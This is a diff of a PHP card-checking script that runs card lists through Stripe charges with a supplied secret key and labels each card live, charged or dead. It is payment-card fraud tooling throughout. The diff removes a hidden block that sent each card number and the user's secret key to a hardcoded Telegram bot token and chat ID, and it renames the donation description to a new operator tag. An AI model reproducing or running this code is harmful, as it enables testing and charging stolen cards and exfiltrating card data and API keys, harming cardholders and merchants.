@@ -1,5 +1,10 @@
 <?php
 
+
+
+
+
+
 error_reporting(0);
 date_default_timezone_set('America/Buenos_Aires');
 
@@ -21,7 +26,7 @@ function multiexplode($seperator, $string){
     $two = explode($seperator[0], $one);
     return $two;
     };
-$domain = $_SERVER['HTTP_HOST'];
+
 $idd = $_GET['idd'];
 $amt = $_GET['cst'];
 if(empty($amt)) {
@@ -37,6 +42,10 @@ $lista = $_GET['lista'];
 
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
+
+
+
+
 
 //================= [ CURL REQUESTS ] =================//
 
@@ -106,7 +115,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=SoilMan Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -130,36 +139,12 @@ break;
 
 }
 
-// ---------------------------------------------------- Hit To Telegram Start----------------------------
-$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
-$botToken = urlencode('6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M');
-$chatID = urlencode('-1001989435427');
 
-$charged_message = "CC:$lista\r\n➤ SK Key:$sk\r\n";
-
-$sendcharged = 'https://api.telegram.org/bot' . $botToken . '/sendMessage?chat_id=' . $chatID . '&text=' . urlencode($charged_message) . '';
-
-$max_retries = 1;
-$num_retries = 0;
-$sendchargedtotg = false;
-$sendinsufftotg = false;
-// ---------------------------------------------------- Hit To Telegram End-------------------------------
 
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-  
-    echo '<span class="badge badge-success"><b>#CHARGED</b></span> <font class="text-white"><b>'.$lista.'</b></font> <font class="text-white">
-    <br>
-    ➤ Response: $'.$amt.' CCN Charged ✅
-    <br>
-    ➤ Receipt: <span style="color: green;" class="badge"><a href="' . $receipturl . '"  target="_blank"><b>Here</b></a></span>
-    <br>
-    ➤ Checked from: <b>' . $domain . '</b></font><br>';
-    while (!$sendchargedtotg && $num_retries < $max_retries) {
-        $sendchargedtotg = @file_get_contents($sendcharged);
-        $num_retries++;
-    }
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $'.$amt.' CCN Charged ✅ SoilMan0_0  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
@@ -167,33 +152,35 @@ elseif(strpos($result2,'"cvc_check": "pass"')){
 
 
 elseif(strpos($result1, "generic_decline")) {
-    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
     }
 elseif(strpos($result2, "generic_decline" )) {
-    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINED</span><br>';
 }
 elseif(strpos($result2, "insufficient_funds" )) {
-    echo "<font color=#0ec9e7><b>LIVE [ Insufficient_Funds ]<br> $lista<br>";
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS</span><br>';
 }
 
 elseif(strpos($result2, "fraudulent" )) {
-    echo '<font color=red><b>DEAD [FRAUDULENT ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
 elseif(strpos($resul3, "do_not_honor" )) {
-    echo '<font color=red><b>DEAD [ DO NOT HONO ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
     }
 elseif(strpos($resul2, "do_not_honor" )) {
-    echo '<font color=red><b>DEAD [ DO NOT HONO ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result,"fraudulent")){
-    echo '<font color=red><b>DEAD [ FRAUDULENT ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
+
 }
 
 elseif(strpos($result2,'"code": "incorrect_cvc"')){
-    echo "<font color=#0ec9e7><b>LIVE [ Security code is incorrect ]<br> $lista<br>";
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
 }
 elseif(strpos($result1,' "code": "invalid_cvc"')){
-    echo "<font color=#0ec9e7><b>LIVE [ Security code is incorrect ]<br> $lista<br>";
+    echo 'CCN</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect</span><br>';
+     
 }
 elseif(strpos($result1,"invalid_expiry_month")){
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: INVAILD EXPIRY MONTH</span><br>';
@@ -205,7 +192,7 @@ elseif(strpos($result2,"invalid_account")){
 }
 
 elseif(strpos($result2, "do_not_honor")) {
-    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result2, "lost_card" )) {
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: LOST CARD</span><br>';
@@ -285,70 +272,75 @@ elseif(strpos($result1, "incorrect_number")) {
 
 
 }elseif(strpos($result1, "do_not_honor")) {
-    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 
 }
 elseif(strpos($result1, 'Your card was declined.')) {
-    echo '<font color=red><b>DEAD [ CARD DECLINED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+
 }
 elseif(strpos($result1, "do_not_honor")) {
-    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
     }
 elseif(strpos($result2, "generic_decline")) {
-    echo '<font color=red><b>DEAD [ Generic_Decline ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC CARD</span><br>';
 }
 elseif(strpos($result, 'Your card was declined.')) {
-    echo '<font color=red><b>DEAD [ CARD DECLINED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED</span><br>';
+
 }
 elseif(strpos($result2,' "decline_code": "do_not_honor"')){
-    echo '<font color=red><b>DEAD [ DO NOT HONOR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
-    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : FAIL</span><br>';
 }
 elseif(strpos($result2, "card_not_supported")) {
 	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unavailable"')){
-    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "unchecked"')){
     echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
 }
 elseif(strpos($result2,'"cvc_check": "fail"')){
-    echo '<font color=red><b>DEAD [ CVC_CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
 }
 elseif(strpos($result2,"currency_not_supported")) {
-    echo '<font color=red><b>DEAD [ CURRENCY NOT SUPORTED TRY IN INR ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+	echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
 }
 
 elseif (strpos($result,'Your card does not support this type of purchase.')) {
-    echo '<font color=red><b>DEAD [ CARD NOT SUPPORT THIS TYPE OF PURCHASE]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
     }
 
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
 }
 elseif(strpos($result2, "fraudulent" )) {
-    echo '<font color=red><b>DEAD [ FRAUDULENT]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT</span><br>';
 }
 elseif(strpos($result1, "testmode_charges_only" )) {
-    echo '<font color=red><b>DEAD [ testmode_charges_only ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY DEAD OR INVALID</span><br>';
 }
 elseif(strpos($result1, "api_key_expired" )) {
-    echo '<font color=red><b>DEAD [SK KEY REVOKED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: SK KEY REVOKED</span><br>';
 }
 elseif(strpos($result1, "parameter_invalid_empty" )) {
-    echo '<font color=red><b>DEAD [ENTER CC TO CHECK ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: ENTER CC TO CHECK</span><br>';
 }
 elseif(strpos($result1, "card_not_supported" )) {
-    echo '<font color=red><b>DEAD [ CARD NOT SUPPORTED ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
 }
 else {
-    echo '<font color=red><b>DEAD [ INCREASE AMOUNT OR TRY ANOTHER CARD ]<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ']</span><br><span style="color: #ff4747;  font-weight: bold; margin-bottom:3px;">'.$lista.'</span><br>';
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
+   
+   
+      
 }
 
 
@@ -361,8 +353,7 @@ else {
 //echo "<b>Risk Level:</b> $riskl<br>";
 //echo "<b>Seller Message:</b> $seller_msg<br>";
 
-
-// echo '<span style="color: rgb(0 255 0);  font-weight: bold"> [Re: ' . $x . ' [Re: </span><br>';
+echo " BYPASSING: $x <br>";
 
 //echo "<br><b>Result3: </b> $result2<br>";
 
